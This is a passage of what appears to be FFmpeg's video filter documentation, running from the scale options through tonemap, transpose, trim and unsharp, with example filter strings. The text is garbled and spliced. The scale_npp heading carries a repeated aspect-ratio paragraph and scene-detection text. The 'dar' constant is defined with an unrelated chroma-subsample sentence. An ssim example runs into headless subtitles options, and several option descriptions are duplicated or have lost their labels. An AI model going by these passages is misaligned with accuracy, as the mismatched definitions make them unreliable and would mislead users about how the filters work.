This allows the autodetected value to be overridden as well as allows forcing
a specific value used for the output and encoder. Possible values:

‘`auto`’

Choose automatically. This is the default.

`force_original_aspect_ratio`

Enable decreasing or increasing output video width or height if necessary to
keep the original aspect ratio. Possible values:

‘`disable`’

Scale the video as specified and disable this feature.

‘`decrease`’

The output video dimensions will automatically be decreased if needed.

‘`increase`’

The output video dimensions will automatically be increased if needed.

One useful instance of this option is that when you know a specific device’s
maximum allowed resolution, you can use this to limit the output video to
that, while retaining the aspect ratio. For example, device A allows
1280x720 playback, and your video is 1920x800. Using this option (set it to
decrease) and specifying 1280x720 to the command line makes the output
1280x533.

Please note that this is a different thing than specifying -1 for `w`
or `h`, you still need to specify the output resolution for this option
to work.

`force_divisible_by`

Ensures that both the output dimensions, width and height, are divisible by the
given integer when used together with `force_original_aspect_ratio`. This
works similar to using `-n` in the `w` and `h` options.

This option respects the value set for `force_original_aspect_ratio`,
increasing or decreasing the resolution accordingly. The video’s aspect ratio
may be slightly modified.

This option can be handy if you need to have a video fit within or exceed
a defined resolution using `force_original_aspect_ratio` but also have
encoder restrictions on width or height divisibility.

The values of the `w` and `h` options are expressions
containing the following constants:

in\_w
in\_h

The input width and height

iw
ih

These are the same as in\_w and in\_h.

out\_w
out\_h

The output (scaled) width and height

ow
oh

a

The same as iw / ih

sar

input sample aspect ratio

dar

pixel format "yuv422p" hsub is 2 and vsub is 1.

ohsub
ovsub

horizontal and vertical output chroma subsample values. For example for the
pixel format "yuv422p" hsub is 2 and vsub is 1.

n

The (sequential) number of the input frame, starting from 0.
Only available with `eval=frame`.

t

The presentation timestamp of the input frame, expressed as a number of
seconds. Only available with `eval=frame`.

pos

The position (byte offset) of the frame in the input stream, or NaN if
this information is unavailable and/or meaningless (for example in case of synthetic video).
Only available with `eval=frame`.
Deprecated, do not use.

ref\_w, rw
ref\_h, rh
ref\_a
ref\_dar, rdar
ref\_n
ref\_t
ref\_pos

Eqvuialent to the above, but for a second reference input. If any of these
variables are present, this filter accepts two inputs.

#### [11.218.2 Examples](#toc-Examples-115)

* Scale the input video to a size of 200x100
  ```
  scale=w=200:h=100

  ```

  This is equivalent to:

  ```
  scale=200:100

  ```

  or:

  ```
  scale=200x100

  ```
* Specify a size abbreviation for the output size:
  ```
  scale=qcif

  ```

  which can also be written as:

  ```
  scale=size=qcif

  ```
* Scale the input to 2x:
  ```
  scale=w=2*iw:h=2*ih

  ```
* The above is the same as:
  ```
  scale=2*in_w:2*in_h

  ```
* Scale the input to 2x with forced interlaced scaling:
  ```
  scale=2*iw:2*ih:interl=1

  ```
* Scale the input to half size:
  ```
  scale=w=iw/2:h=ih/2

  ```
* Increase the width, and set the height to the same size:
  ```
  scale=3/2*iw:ow

  ```
* Seek Greek harmony:
  ```
  scale=iw:1/PHI*iw
  scale=ih*PHI:ih

  ```
* Increase the height, and set the width to 3/2 of the height:
  ```
  scale=w=3/2*oh:h=3/5*ih

  ```
* Increase the size, making the size a multiple of the chroma
  subsample values:
  ```
  scale="trunc(3/2*iw/hsub)*hsub:trunc(3/2*ih/vsub)*vsub"

  ```
* Increase the width to a maximum of 500 pixels,
  keeping the same aspect ratio as the input:
  ```
  scale=w='min(500\, iw*3/2):h=-1'

  ```
* Make pixels square by combining scale and setsar:
  ```
  scale='trunc(ih*dar):ih',setsar=1/1

  ```
* Make pixels square by combining scale and setsar,
  making sure the resulting resolution is even (required by some codecs):
  ```
  scale='trunc(ih*dar/2)*2:trunc(ih/2)*2',setsar=1/1

  ```
* Scale a subtitle stream (sub) to match the main video (main) in size before
  overlaying. ("scale2ref")
  ```
  '[main]split[a][b]; [ref][a]scale=rw:rh[c]; [b][c]overlay'

  ```
* Scale a logo to 1/10th the height of a video, while preserving its display
  aspect ratio.
  ```
  [logo-in][video-in]scale=w=oh*dar:h=rh/10[logo-out]

  ```

#### [11.218.3 Commands](#toc-Commands-138)

This filter supports the following commands:

value.

### [11.219 scale\_cuda](#toc-scale_005fcuda-1)

Scale (resize) and convert (pixel format) the input video, using accelerated CUDA kernels.
Setting the output width and height works in the same way as for the [scale](#scale) filter.

The filter accepts the following options:

`w`
`h`

Set the output video dimension expression. Default value is the input dimension.

Allows for the same expressions as the [scale](#scale) filter.

`passthrough`

If set to 0, every frame is processed, even if no conversion is necessary.
This mode can be useful to use the filter as a buffer for a downstream
frame-consumer that exhausts the limited decoder frame pool.

If set to 1, frames are passed through as-is if they match the desired output
parameters. This is the default behaviour.

`param`

Algorithm-Specific parameter.

Affects the curves of the bicubic algorithm.

`force_original_aspect_ratio`
`force_divisible_by`

Work the same as the identical [scale](#scale) filter options.

#### [11.219.1 Examples](#toc-Examples-116)

* Scale input to 720p, keeping aspect ratio and ensuring the output is yuv420p.
  ```
  scale_cuda=-2:720:format=yuv420p

  ```
* Upscale to 4K using nearest neighbour algorithm.
  ```
  scale_cuda=4096:2160:interp_algo=nearest

  ```
* Don’t do any conversion or scaling, but copy all input frames into newly allocated ones.
  This can be useful to deal with a filter and encode chain that otherwise exhausts the
  decoders frame pool.
  ```
  scale_cuda=passthrough=0

  ```

### [11.220 scale\_npp](#toc-scale_005fnpp-1)

that, while retaining the aspect ratio. For example, device A allows
1280x720 playback, and your video is 1920x800. Using this option (set it to
decrease) and specifying 1280x720 to the command line makes the output
1280x533.

This filter sets frame metadata with mafd between frame, the scene score, and
forward the frame to the next filter, so they can use these metadata to detect
scene change or others.

In addition, this filter logs a message and sets frame metadata when it detects
a scene change by `threshold`.

`lavfi.scd.mafd` metadata keys are set with mafd for every frame.

`lavfi.scd.score` metadata keys are set with scene change score for every frame
to detect scene change.

`lavfi.scd.time` metadata keys are set with current filtered frame time which

### [11.226 selectivecolor](#toc-selectivecolor-1)

Adjust cyan, magenta, yellow and black (CMYK) to certain ranges of colors (such
as "reds", "yellows", "greens", "cyans", ...). The adjustment range is defined
by the "purity" of the color (that is, how saturated it already is).

This filter is similar to the Adobe Photoshop Selective Color tool.

The filter accepts the following options:

`correction_method`

Select color correction method.

Available values are:

‘`absolute`’

Specified adjustments are applied "as-is" (added/subtracted to original pixel
component value).

`reds`

Adjustments for red pixels (pixels where the red component is the maximum)

`yellows`

Adjustments for yellow pixels (pixels where the blue component is the minimum)

`greens`

Adjustments for green pixels (pixels where the green component is the maximum)

`cyans`

Adjustments for cyan pixels (pixels where the red component is the minimum)

`blues`

Adjustments for blue pixels (pixels where the blue component is the maximum)

`magentas`

Adjustments for magenta pixels (pixels where the green component is the minimum)

`whites`

Adjustments for white pixels (pixels where all components are greater than 128)

Adjustments for all pixels except pure black and pure white

`blacks`

Adjustments for black pixels (pixels where all components are lesser than 128)

`psfile`

Specify a Photoshop selective color file (`.asv`) to import the settings from.

  ```
  selectivecolor=psfile=MySelectiveColorPresets/Misty.asv

  ```

### [11.227 separatefields](#toc-separatefields-1)

The `separatefields` takes a frame-based video input and splits
each frame into its components fields, producing a new half height clip
with twice the frame rate and twice the frame count.

This filter use field-dominance information in frame to decide which
of each pair of fields to place first in the output.
If it gets it wrong use [setfield](#setfield) filter before `separatefields` filter.

### [11.228 setdar, setsar](#toc-setdar_002c-setsar)

The `setdar` filter sets the Display Aspect Ratio for the filter
output video.

This is done by changing the specified Sample (aka Pixel) Aspect
Ratio, according to the following equation:

```
DAR = HORIZONTAL_RESOLUTION / VERTICAL_RESOLUTION * SAR

```

Keep in mind that the `setdar` filter does not modify the pixel
dimensions of the video frame. Also, the display aspect ratio set by
this filter may be changed by later filters in the filterchain,
e.g. in case of scaling or if another "setdar" or a "setsar" filter is
applied.

The `setsar` filter sets the Sample (aka Pixel) Aspect Ratio for
the filter output video.

Note that as a consequence of the application of this filter, the
output display aspect ratio will change according to the equation
above.

Keep in mind that the sample aspect ratio set by the `setsar`
filter may be changed by later filters in the filterchain, e.g. if
another "setsar" or a "setdar" filter is applied.

It accepts the following parameters:

`r, ratio, dar (setdar only), sar (setsar only)`

Set the aspect ratio used by the filter.

The parameter can be a floating point number string, or an expression. If the
parameter is not specified, the value "0" is assumed, meaning that the same
input value is used.

`max`

Set the maximum integer value to use for expressing numerator and
denominator when reducing the expressed aspect ratio to a rational.
Default value is `100`.

The parameter sar is an expression containing the following constants:

`w, h`

The input width and height.

`a`

Same as w / h.

`sar`

The input sample aspect ratio.

`dar`

The input display aspect ratio. It is the same as
(w / h) \* sar.

`hsub, vsub`

Horizontal and vertical chroma subsample values. For example, for the
pixel format "yuv422p" hsub is 2 and vsub is 1.

#### [11.228.1 Examples](#toc-Examples-119)

* To change the display aspect ratio to 16:9, specify one of the following:
  ```
  setdar=dar=1.77777
  setdar=dar=16/9

  ```
* To change the sample aspect ratio to 10:11, specify:
  ```
  setsar=sar=10/11

  ```
* To set a display aspect ratio of 16:9, and specify a maximum integer value of
  1000 in the aspect ratio reduction, use the command:
  ```
  setdar=ratio=16/9:max=1000

  ```

### [11.245 ssim](#toc-ssim)

Obtain the SSIM (Structural SImilarity Metric) between two input videos.

This filter takes in input two input videos, the first input is
considered the "main" source and is passed unchanged to the
output. The second input is used as a "reference" video for computing
the SSIM.

Both video inputs must have the same resolution and pixel format for
this filter to work correctly. Also it assumes that both inputs
have the same number of frames, which are compared one by one.

The filter stores the calculated SSIM of each frame.

The description of the accepted parameters follows.

`stats_file, f`

If specified the filter will use the named file to save the SSIM of
each individual frame. When filename equals "-" the data is sent to
standard output.

The file printed if stats\_file is selected, contains a sequence of
key/value pairs of the form key:value for each compared
couple of frames.

A description of each shown parameter follows:

`n`

sequential number of the input frame, starting from 1

`Y, U, V, R, G, B`

SSIM of the compared frames for the component specified by the suffix.

`All`

SSIM of the compared frames for the whole frame.

`dB`

Same as above but in dB representation.

This filter also supports the [framesync](#framesync) options.

#### [11.245.1 Examples](#toc-Examples-125)

* For example:
  ```
  movie=ref_movie.mpg, setpts=PTS-STARTPTS [main];
  [main][ref] ssim="stats_file=stats.log" [out]

  ```

  On this example the input file being processed is compared with the
  reference file `ref_movie.mpg`. The SSIM of each individual frame
  is stored in `stats.log`.
* Another example with both psnr and ssim at same time:
  ```
  ffmpeg -i main.mpg -i ref.mpg -lavfi  "ssim;[0:v][1:v]psnr" -f null -

  ```
* Another example with different containers:
  ```
  ffmpeg -i main.mpg -i ref.mkv -lavfi  "[0:v]settb=AVTB,setpts=PTS-STARTPTS[main];[1:v]settb=AVTB,setpts=PTS-STARTPTS[ref];[main][ref]ssim" -f null -

Set the filename of the subtitle file to read. It must be specified.

`original_size`

Specify the size of the original video, the video for which the ASS file
was composed. For the syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).
Due to a misdesign in ASS aspect ratio arithmetic, this is necessary to
correctly scale the fonts if the aspect ratio has been changed.

`fontsdir`

Set a directory path containing fonts that can be used by the filter.
These fonts will be used in addition to whatever the font provider uses.

`alpha`

Process alpha channel, by default alpha channel is untouched.

`charenc`

Set subtitles input character encoding. `subtitles` filter only. Only
useful if not UTF-8.

`stream_index, si`

Set subtitles stream index. `subtitles` filter only.

`force_style`

Override default style or script info parameters of the subtitles. It accepts a
string containing ASS style format `KEY=VALUE` couples separated by ",".

`wrap_unicode`

Break lines according to the Unicode Line Breaking Algorithm. Availability requires
at least libass release 0.17.0 (or LIBASS\_VERSION 0x01600010), *and* libass must
have been built with libunibreak.

The option is enabled by default except for native ASS.

If the first key is not specified, it is assumed that the first value
specifies the `filename`.

For example, to render the file `sub.srt` on top of the input
video, use the command:

```
subtitles=sub.srt

```

which is equivalent to:

```
subtitles=filename=sub.srt

```

To render the default subtitles stream from file `video.mkv`, use:

```
subtitles=video.mkv

```

To render the second subtitles stream from that file, use:

```
subtitles=video.mkv:si=1

```

To make the subtitles stream from `sub.srt` appear in 80% transparent blue
`DejaVu Serif`, use:

```
subtitles=sub.srt:force_style='Fontname=DejaVu Serif,PrimaryColour=&HCCFF0000'

```

The computed histogram is a representation of the color component
distribution in an image.

The filter accepts the following options:

`width, w`

Set width of single color component output. Default value is `0`.
Value of `0` means width will be picked from input video.
This also set number of passed histograms to keep.
Allowed range is [0, 8192].

`display_mode, d`

Set display mode.
It accepts the following values:

‘`stack`’

Per color component graphs are placed below each other.

‘`parade`’

Per color component graphs are placed side by side.

‘`overlay`’

Presents information identical to that in the `parade`, except
that the graphs representing color components are superimposed directly
over one another.

Default is `stack`.

`levels_mode, m`

Set mode. Can be either `linear`, or `logarithmic`.
Default is `linear`.

`components, c`

‘`rscroll`’

Scroll from left to right.

‘`picture`’

Draw single picture.

Default is `replace`.

### [11.255 threshold](#toc-threshold)

Apply threshold effect to video stream.

This filter needs four video streams to perform thresholding.
First stream is stream we are filtering.
Second stream is holding threshold values, third stream is holding min values,
and last, fourth stream is holding max values.

The filter accepts the following option:

`planes`

Set which planes will be processed, unprocessed planes will be copied.
By default value 0xf, all planes will be processed.

For example if first stream pixel’s component value is less then threshold value
of pixel component from 2nd threshold stream, third stream value will picked,
otherwise fourth stream pixel component value will be picked.

Using color source filter one can perform various types of thresholding:

#### [11.255.1 Commands](#toc-Commands-146)

This filter supports the all options as [commands](#commands).

#### [11.255.2 Examples](#toc-Examples-128)

* Binary threshold, using gray color as threshold:
  ```
  ffmpeg -i 320x240.avi -f lavfi -i color=gray -f lavfi -i color=black -f lavfi -i color=white -lavfi threshold output.avi

  ```
* Inverted binary threshold, using gray color as threshold:
  ```
  ffmpeg -i 320x240.avi -f lavfi -i color=gray -f lavfi -i color=white -f lavfi -i color=black -lavfi threshold output.avi

  ```
* Truncate binary threshold, using gray color as threshold:
  ```
  ffmpeg -i 320x240.avi -f lavfi -i color=gray -i 320x240.avi -f lavfi -i color=gray -lavfi threshold output.avi

  ```
* Threshold to zero, using gray color as threshold:
  ```
  ffmpeg -i 320x240.avi -f lavfi -i color=gray -f lavfi -i color=white -i 320x240.avi -lavfi threshold output.avi

  ```
* Inverted threshold to zero, using gray color as threshold:
  ```
  ffmpeg -i 320x240.avi -f lavfi -i color=gray -i 320x240.avi -f lavfi -i color=white -lavfi threshold output.avi

  ```

### [11.256 thumbnail](#toc-thumbnail)

Select the most representative frame in a given sequence of consecutive frames.

The filter accepts the following options:

`n`

Set the frames batch size to analyze; in a set of n frames, the filter
will pick one of them, and then handle the next batch of n frames until
the end. Default is `100`.

`log`

Set the log level to display picked frame stats.
Default is `info`.

Since the filter keeps track of the whole frames sequence, a bigger n
value will result in a higher memory usage, so a high value is not recommended.

#### [11.256.1 Examples](#toc-Examples-129)

* Extract one picture each 50 frames:
  ```
  thumbnail=50

  ```
* Complete example of a thumbnail creation with `ffmpeg`:
  ```
  ffmpeg -i in.avi -vf thumbnail,scale=300:200 -frames:v 1 out.png

  ```

### [11.257 tile](#toc-tile-1)

Tile several successive frames together.

The [untile](#untile) filter can do the reverse.

The filter accepts the following options:

`layout`

Set the grid size in the form `COLUMNSxROWS`. Range is up to UINT\_MAX cells.
Default is `6x5`.

`nb_frames`

Set the maximum number of frames to render in the given area. It must be less
than or equal to wxh. The default value is `0`, meaning all
the area will be used.

`margin`

Set the outer border margin in pixels. Range is 0 to 1024. Default is `0`.

`padding`

Set the inner border thickness (i.e. the number of pixels between frames). For
more advanced padding options (such as having different values for the edges),
refer to the pad video filter. Range is 0 to 1024. Default is `0`.

`color`

Specify the color of the unused area. For the syntax of this option, check the
[(ffmpeg-utils)"Color" section in the ffmpeg-utils manual](ffmpeg-utils.html#color-syntax).
The default value of color is "black".

`overlap`

Set the number of frames to overlap when tiling several successive frames together.
The value must be between `0` and nb\_frames - 1. Default is `0`.

`init_padding`

Set the number of frames to initially be empty before displaying first output frame.
This controls how soon will one get first output frame.
The value must be between `0` and nb\_frames - 1. Default is `0`.

#### [11.257.1 Examples](#toc-Examples-130)

* Produce 8x8 PNG tiles of all keyframes (`-skip_frame nokey`) in a movie:
  ```
  ffmpeg -skip_frame nokey -i file.avi -vf 'scale=128:72,tile=8x8' -an -vsync 0 keyframes%03d.png

  ```

  The `-vsync 0` is necessary to prevent `ffmpeg` from
  duplicating each output frame to accommodate the originally detected frame
  rate.
* Display `5` pictures in an area of `3x2` frames,
  with `7` pixels between them, and `2` pixels of initial margin, using
  mixed flat and named options:
  ```
  tile=3x2:nb_frames=5:padding=7:margin=2

  ```

### [11.258 tiltandshift](#toc-tiltandshift)

Apply tilt-and-shift effect.

What happens when you invert time and space?

Normally a video is composed of several frames that represent a different
instant of time and shows a scene that evolves in the space captured by the
frame. This filter is the antipode of that concept, taking inspiration from
tilt and shift photography.

A filtered frame contains the whole timeline of events composing the sequence,
and this is obtained by placing a slice of pixels from each frame into a single
one. However, since there are no infinite-width frames, this is done up the
width of the input frame, and a video is recomposed by shifting away one
column for each subsequent frame. In order to map space to time, the filter
tilts each input frame as well, so that motion is preserved. This is accomplished
by progressively selecting a different column from each input frame.

The end result is a sort of inverted parallax, so that far away objects move
much faster that the ones in the front. The ideal conditions for this video
effect are when there is either very little motion and the backgroud is static,
or when there is a lot of motion and a very wide depth of field (e.g. wide
panorama, while moving on a train).

The filter accepts the following parameters:

`tilt`

Tilt video while shifting (default). When unset, video will be sliding a
static image, composed of the first column of each frame.

`start`

What to do at the start of filtering (see below).

`end`

What to do at the end of filtering (see below).

`hold`

How many columns should pass through before start of filtering.

`pad`

How many columns should be inserted before end of filtering.

Normally the filter shifts and tilts from the very first frame, and stops when
the last one is received. However, before filtering starts, normal video may
be preseved, so that the effect is slowly shifted in its place. Similarly,
the last video frame may be reconstructed at the end. Alternatively it is
possible to just start and end with black.

‘`none`’

Filtering starts immediately and ends when the last frame is received.

‘`frame`’

The first frames or the very last frame are kept intact during processing.

‘`black`’

Black is padded at the beginning or at the end of filtering.

### [11.259 tinterlace](#toc-tinterlace)

Perform various types of temporal field interlacing.

Frames are counted starting from 1, so the first input frame is
considered odd.

The filter accepts the following options:

`mode`

Specify the mode of the interlacing. This option can also be specified
as a value alone. See below for a list of values for this option.

Available values are:

‘`merge, 0`’

Move odd frames into the upper field, even into the lower field,
generating a double height frame at half frame rate.

```

Numeric values are deprecated but are accepted for backward
compatibility reasons.

Default mode is `merge`.

`flags`

Specify flags influencing the filter process.

Available value for flags is:

`low_pass_filter, vlpf`

Enable linear vertical low-pass filtering in the filter.
Vertical low-pass filtering is required when creating an interlaced
destination from a progressive source which contains high-frequency
vertical detail. Filtering will reduce interlace ’twitter’ and Moire
patterning.

`complex_filter, cvlpf`

Enable complex vertical low-pass filtering.
This will slightly less reduce interlace ’twitter’ and Moire
patterning but better retain detail and subjective sharpness impression.

`bypass_il`

Bypass already interlaced frames, only adjust the frame rate.

Vertical low-pass filtering and bypassing already interlaced frames can only be
enabled for `mode` interleave\_top and interleave\_bottom.

### [11.260 tmedian](#toc-tmedian)

Pick median pixels from several successive input video frames.

The filter accepts the following options:

`radius`

Set radius of median filter.
Default is 1. Allowed range is from 1 to 127.

`planes`

Set which planes to filter. Default value is `15`, by which all planes are processed.

`percentile`

Set median percentile. Default value is `0.5`.
Default value of `0.5` will pick always median values, while `0` will pick
minimum values, and `1` maximum values.

#### [11.260.1 Commands](#toc-Commands-147)

This filter supports all above options as [commands](#commands), excluding option `radius`.

### [11.261 tmidequalizer](#toc-tmidequalizer)

Apply Temporal Midway Video Equalization effect.

Midway Video Equalization adjusts a sequence of video frames to have the same
histograms, while maintaining their dynamics as much as possible. It’s
useful for e.g. matching exposures from a video frames sequence.

This filter accepts the following option:

`radius`

Set filtering radius. Default is `5`. Allowed range is from 1 to 127.

`sigma`

Set filtering sigma. Default is `0.5`. This controls strength of filtering.
Setting this option to 0 effectively does nothing.

`planes`

Set which planes to process. Default is `15`, which is all available planes.

### [11.262 tmix](#toc-tmix)

Mix successive video frames.

A description of the accepted options follows.

`frames`

The number of successive frames to mix. If unspecified, it defaults to 3.

`weights`

Specify weight of each input video frame.
Each weight is separated by space. If number of weights is smaller than
number of frames last specified weight will be used for all remaining
unset weights.

`scale`

Specify scale, if it is set it will be multiplied with sum
of each weight multiplied with pixel values to give final destination
pixel value. By default scale is auto scaled to sum of weights.

`planes`

Set which planes to filter. Default is all. Allowed range is from 0 to 15.

#### [11.262.1 Examples](#toc-Examples-131)

* Average 7 successive frames:
  ```
  tmix=frames=7:weights="1 1 1 1 1 1 1"

  ```
* Apply simple temporal convolution:
  ```
  tmix=frames=3:weights="-1 3 -1"

  ```
* Similar as above but only showing temporal differences:
  ```
  tmix=frames=3:weights="-1 2 -1":scale=1

  ```

#### [11.262.2 Commands](#toc-Commands-148)

This filter supports the following commands:

`weights`
`scale`
`planes`

Syntax is same as option with same name.

### [11.263 tonemap](#toc-tonemap-1)

Tone map colors from different dynamic ranges.

This filter expects data in single precision floating point, as it needs to
operate on (and can output) out-of-range values. Another filter, such as
[zscale](#zscale), is needed to convert the resulting frame to a usable format.

The tonemapping algorithms implemented only work on linear light, so input
data should be linearized beforehand (and possibly correctly tagged).

```
ffmpeg -i INPUT -vf zscale=transfer=linear,tonemap=clip,zscale=transfer=bt709,format=yuv420p OUTPUT

```

#### [11.263.1 Options](#toc-Options-3)

The filter accepts the following options.

`tonemap`

Set the tone map algorithm to use.

Possible values are:

none

Do not apply any tone map, only desaturate overbright pixels.

clip

Hard-clip any out-of-range values. Use it for perfect color accuracy for
in-range values, while distorting out-of-range values.

linear

Stretch the entire reference gamut to a linear multiple of the display.

gamma

Fit a logarithmic transfer between the tone curves.

reinhard

Preserve overall image brightness with a simple curve, using nonlinear
contrast, which results in flattening details and degrading color accuracy.

hable

Preserve both dark and bright details better than reinhard, at the cost
of slightly darkening everything. Use it when detail preservation is more
important than color and brightness accuracy.

mobius

Smoothly map out-of-range values, while retaining contrast and colors for
in-range material as much as possible. Use it when color accuracy is more
important than detail preservation.

Default is none.

`param`

Tune the tone mapping algorithm.

This affects the following algorithms:

none

Ignored.

linear

Specifies the scale factor to use while stretching.
Default to 1.0.

gamma

Specifies the exponent of the function.
Default to 1.8.

clip

Specify an extra linear coefficient to multiply into the signal before clipping.
Default to 1.0.

reinhard

Specify the local contrast coefficient at the display peak.
Default to 0.5, which means that in-gamut values will be about half as bright
as when clipping.

hable

Ignored.

mobius

Specify the transition point from linear to mobius transform. Every value
below this point is guaranteed to be mapped 1:1. The higher the value, the
more accurate the result will be, at the cost of losing bright details.
Default to 0.3, which due to the steep initial slope still preserves in-range
colors fairly accurately.

`desat`

Apply desaturation for highlights that exceed this level of brightness. The
higher the parameter, the more color information will be preserved. This
setting helps prevent unnaturally blown-out colors for super-highlights, by
(smoothly) turning into white instead. This makes images feel more natural,
at the cost of reducing information about out-of-range colors.

The default of 2.0 is somewhat conservative and will mostly just apply to
skies or directly sunlit surfaces. A setting of 0.0 disables this option.

This option works only if the input frame has a supported color tag.

`peak`

Override signal/nominal/reference peak with this value. Useful when the
embedded peak information in display metadata is not reliable or when tone
mapping from a lower range to a higher range.

### [11.264 tpad](#toc-tpad)

Temporarily pad video frames.

The filter accepts the following options:

`start`

Specify number of delay frames before input video stream. Default is 0.

`stop`

Specify number of padding frames after input video stream.
Set to -1 to pad indefinitely. Default is 0.

`start_mode`

Set kind of frames added to beginning of stream.
Can be either add or clone.
With add frames of solid-color are added.
With clone frames are clones of first frame.
Default is add.

`stop_mode`

Set kind of frames added to end of stream.
Can be either add or clone.
With add frames of solid-color are added.
With clone frames are clones of last frame.
Default is add.

`start_duration, stop_duration`

Specify the duration of the start/stop delay. See
[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax)
for the accepted syntax.
These options override start and stop. Default is 0.

`color`

Specify the color of the padded area. For the syntax of this option,
check the [(ffmpeg-utils)"Color" section in the ffmpeg-utils
manual](ffmpeg-utils.html#color-syntax).

The default value of color is "black".

### [11.265 transpose](#toc-transpose-1)

Transpose rows with columns in the input video and optionally flip it.

It accepts the following parameters:

`dir`

Specify the transposition direction.

Can assume the following values:

‘`0, 4, cclock_flip`’

Rotate by 90 degrees counterclockwise and vertically flip (default), that is:

```
L.R     L.l
. . ->  . .
l.r     R.r

```

‘`1, 5, clock`’

Rotate by 90 degrees clockwise, that is:

```
L.R     l.L
. . ->  . .
l.r     r.R

```

‘`2, 6, cclock`’

Rotate by 90 degrees counterclockwise, that is:

```
L.R     R.r
. . ->  . .
l.r     L.l

```

‘`3, 7, clock_flip`’

Rotate by 90 degrees clockwise and vertically flip, that is:

```
L.R     r.R
. . ->  . .
l.r     l.L

```

For values between 4-7, the transposition is only done if the input
video geometry is portrait and not landscape. These values are
deprecated, the `passthrough` option should be used instead.

Numerical values are deprecated, and should be dropped in favor of
symbolic constants.

`passthrough`

Do not apply the transposition if the input geometry matches the one
specified by the specified value. It accepts the following values:

‘`none`’

Always apply transposition.

‘`portrait`’

Preserve portrait geometry (when height >= width).

‘`landscape`’

Preserve landscape geometry (when width >= height).

Default value is `none`.

For example to rotate by 90 degrees clockwise and preserve portrait
layout:

```
transpose=dir=1:passthrough=portrait

```

The command above can also be specified as:

```
transpose=1:portrait

```

### [11.266 transpose\_npp](#toc-transpose_005fnpp)

Transpose rows with columns in the input video and optionally flip it.
For more in depth examples see the [transpose](#transpose) video filter, which shares mostly the same options.

It accepts the following parameters:

`dir`

Specify the transposition direction.

Can assume the following values:

‘`cclock_flip`’

Rotate by 90 degrees counterclockwise and vertically flip. (default)

‘`clock`’

Rotate by 90 degrees clockwise.

‘`cclock`’

Rotate by 90 degrees counterclockwise.

‘`clock_flip`’

Rotate by 90 degrees clockwise and vertically flip.

`passthrough`

Do not apply the transposition if the input geometry matches the one
specified by the specified value. It accepts the following values:

‘`none`’

Always apply transposition. (default)

‘`portrait`’

Preserve portrait geometry (when height >= width).

‘`landscape`’

Preserve landscape geometry (when width >= height).

### [11.267 trim](#toc-trim)

Trim the input so that the output contains one continuous subpart of the input.

It accepts the following parameters:

`start`

Specify the time of the start of the kept section, i.e. the frame with the
timestamp start will be the first frame in the output.

`end`

Specify the time of the first frame that will be dropped, i.e. the frame
immediately preceding the one with the timestamp end will be the last
frame in the output.

`start_pts`

This is the same as start, except this option sets the start timestamp
in timebase units instead of seconds.

`end_pts`

This is the same as end, except this option sets the end timestamp
in timebase units instead of seconds.

`duration`

The maximum duration of the output in seconds.

`start_frame`

The number of the first frame that should be passed to the output.

`end_frame`

The number of the first frame that should be dropped.

`start`, `end`, and `duration` are expressed as time
duration specifications; see
[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax)
for the accepted syntax.

Note that the first two sets of the start/end options and the `duration`
option look at the frame timestamp, while the \_frame variants simply count the
frames that pass through the filter. Also note that this filter does not modify
the timestamps. If you wish for the output timestamps to start at zero, insert a
setpts filter after the trim filter.

If multiple start or end options are set, this filter tries to be greedy and
keep all the frames that match at least one of the specified constraints. To keep
only the part that matches all the constraints at once, chain multiple trim
filters.

The defaults are such that all the input is kept. So it is possible to set e.g.
just the end values to keep everything before the specified time.

Examples:

* Drop everything except the second minute of input:
  ```
  ffmpeg -i INPUT -vf trim=60:120

  ```
* Keep only the first second:
  ```
  ffmpeg -i INPUT -vf trim=duration=1

  ```

### [11.268 unpremultiply](#toc-unpremultiply)

of second stream as alpha.

Both streams must have same dimensions and same pixel format.

The filter accepts the following option:

`planes`

Set which planes will be processed, unprocessed planes will be copied.
By default value 0xf, all planes will be processed.

If the format has 1 or 2 components, then luma is bit 0.
If the format has 3 or 4 components:
for RGB formats bit 0 is green, bit 1 is blue and bit 2 is red;
for YUV formats bit 0 is luma, bit 1 is chroma-U and bit 2 is chroma-V.
If present, the alpha channel is always the last bit.

`inplace`

Do not require 2nd input for processing, instead use alpha plane from input stream.

### [11.269 unsharp](#toc-unsharp-1)

and 23. The default value is 5.

`luma_amount, la`

Set the luma effect strength. It must be a floating point number, reasonable
values lay between -1.5 and 1.5.

Negative values will blur the input video, while positive values will
sharpen it, a value of zero will disable the effect.

Default value is 1.0.

`chroma_msize_x, cx`

Set the chroma matrix horizontal size. It must be an odd integer
between 3 and 23. The default value is 5.

between 3 and 23. The default value is 5.

`chroma_amount, ca`

Set the chroma effect strength. It must be a floating point number, reasonable
values lay between -1.5 and 1.5.

Negative values will blur the input video, while positive values will
sharpen it, a value of zero will disable the effect.

Default value is 0.0.

`alpha_msize_x, ax`

Set the alpha matrix horizontal size. It must be an odd integer
between 3 and 23. The default value is 5.

`alpha_msize_y, ay`

between 3 and 23. The default value is 5.

`alpha_amount, aa`

Set the alpha effect strength. It must be a floating point number, reasonable
values lay between -1.5 and 1.5.

Negative values will blur the input video, while positive values will
sharpen it, a value of zero will disable the effect.

All parameters are optional and default to the equivalent of the
string ’5:5:1.0:5:5:0.0’.

#### [11.269.1 Examples](#toc-Examples-132)

  ```
  unsharp=luma_msize_x=7:luma_msize_y=7:luma_amount=2.5

  ```
* Apply a strong blur of both luma and chroma parameters:
  ```
  unsharp=7:7:-2:7:7:-2

  ```

### [11.270 untile](#toc-untile-1)

Decompose a video made of tiled images into the individual images.

The frame rate of the output video is the frame rate of the input video
multiplied by the number of tiles.

This filter does the reverse of [tile](#tile).

The filter accepts the following options:

`layout`

Set the grid size (i.e. the number of lines and columns). For the syntax of
this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).

#### [11.270.1 Examples](#toc-Examples-133)

* Produce a 1-second video from a still image file made of 25 frames stacked
  vertically, like an analogic film reel:
  ```
  ffmpeg -r 1 -i image.jpg -vf untile=1x25 movie.mkv

  ```

### [11.271 uspp](#toc-uspp)

Apply ultra slow/simple postprocessing filter that compresses and decompresses
the image at several (or - in the case of `quality` level `8` - all)
shifts and average the results.

The way this differs from the behavior of spp is that uspp actually encodes &
decodes each case with libavcodec Snow, whereas spp uses a simplified intra only 8x8
DCT similar to MJPEG.

